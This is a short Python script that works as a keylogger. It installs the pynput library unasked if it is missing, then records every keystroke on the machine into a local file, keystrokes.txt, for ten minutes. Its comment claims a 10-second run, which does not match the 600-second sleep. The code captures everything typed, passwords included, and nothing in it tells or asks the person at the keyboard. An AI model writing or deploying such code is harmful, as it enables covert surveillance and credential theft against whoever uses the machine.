import os
import threading
import time

# Function to install a package using pip
def install_package(package):
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Check if pynput is installed, and install it if necessary
try:
    import pynput
except ImportError:
    print("pynput is not installed. Installing...")
    install_package("pynput")
    import pynput

from pynput.keyboard import Key, Listener

def create_note_file():
    # Get the directory of the script
    script_dir = os.path.dirname(os.path.realpath(__file__))
    # Create the note file in the same directory
    note_file = os.path.join(script_dir, "keystrokes.txt")
    # Create the note file if it doesn't exist
    if not os.path.exists(note_file):
        with open(note_file, "w"):
            pass
    return note_file

def on_press(key):
    try:
        # Convert the key to string
        key_str = str(key.char)
    except AttributeError:
        # Special keys (e.g., Enter, Shift, etc.)
        key_str = str(key)

    if key_str == "Key.enter":
        key_str = "\n"
    
    # Save the key to the note file
    with open(note_file, "a") as file:
        file.write(key_str)

def key_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    note_file = create_note_file()

    listener_thread = threading.Thread(target=key_listener)
    listener_thread.daemon = True
    listener_thread.start()

    # Terminate the script after 10 seconds
    # 600 seconds = 10 minutes
    time.sleep(600)

    print("\nExiting...")
